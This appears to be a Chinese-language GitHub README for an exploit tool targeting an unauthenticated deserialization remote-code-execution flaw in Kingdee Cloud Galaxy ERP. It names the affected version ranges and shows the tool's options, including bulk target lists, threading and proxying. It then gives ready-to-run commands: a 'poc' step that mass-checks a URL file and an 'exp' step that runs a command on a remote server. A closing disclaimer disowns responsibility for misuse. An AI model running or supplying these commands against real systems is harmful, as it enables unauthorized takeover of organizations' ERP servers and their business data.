## 金蝶云星空 Kingdee-erp-Unserialize-RCE

由于金蝶云星空数据通信默认采用的是二进制数据格式，需要进行序列化与反序列化，在此过程中未对数据进行签名或校验，导致客户端发出的数据可被攻击者恶意篡改，写入包含恶意代码的序列化数据，达到在服务端远程命令执行的效果。该漏洞不仅存在于金蝶云星空管理中心（默认8000端口），普通应用（默认80端口）也存在类似问题。

影响范围：

6.x版本：低于6.2.1012.4

7.x版本：7.0.352.16 至 7.7.0.202111

8.x版本：8.0.0.202205 至 8.1.0.20221110

```
usage: Kingdee-erp-Unserialize-RCE.py [-h] [-u URL] [--check] [-f FILE] [-t THREAD] [-T TIMEOUT] [-o OUTPUT] [-p PROXY] [--cmd CMD]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target url(e.g. http://127.0.0.1)
  --check               Check if vulnerable
  -f FILE, --file FILE  Target file(e.g. url.txt)
  -t THREAD, --thread THREAD
                        Number of thread (default 5)
  -T TIMEOUT, --timeout TIMEOUT
                        Request timeout (default 3)
  -o OUTPUT, --output OUTPUT
                        Vuln url output file (e.g. result.txt)
  -p PROXY, --proxy PROXY
                        Request Proxy (e.g http://127.0.0.1:8080)
```

### poc

```
python .\Kingdee-erp-Unserialize-RCE.py -f .\url.txt --check -t 10
```

![](https://raw.githubusercontent.com/Sweelg/-Kingdee-erp-Unserialize-RCE/master/img/1.png)

### exp

```
python .\Kingdee-erp-Unserialize-RCE.py -u http://host --cmd 'dir'
```

![](https://raw.githubusercontent.com/Sweelg/-Kingdee-erp-Unserialize-RCE/master/img/2.png)

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，**均由使用者本人负责，作者不为此承担任何责任**。
